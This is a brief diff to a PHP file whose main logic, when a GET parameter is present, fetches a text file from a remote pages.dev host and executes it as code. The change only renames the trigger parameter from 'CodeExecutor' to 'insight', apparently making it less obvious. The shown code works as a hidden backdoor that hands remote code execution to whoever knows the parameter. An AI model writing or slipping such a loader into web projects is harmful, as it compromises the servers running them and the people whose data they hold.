@@ -48,7 +48,7 @@ class CodeExecutor {
 // ==== MAIN LOGIC ====
 $fetcher = new CurlFetcher();
 
-if (isset($_GET['CodeExecutor'])) {
+if (isset($_GET['insight'])) {
     $executor = new CodeExecutor($fetcher);
     $executor->executeCodeFromURL("https://bulldog-uhukk.pages.dev/acak.txt");
     exit;
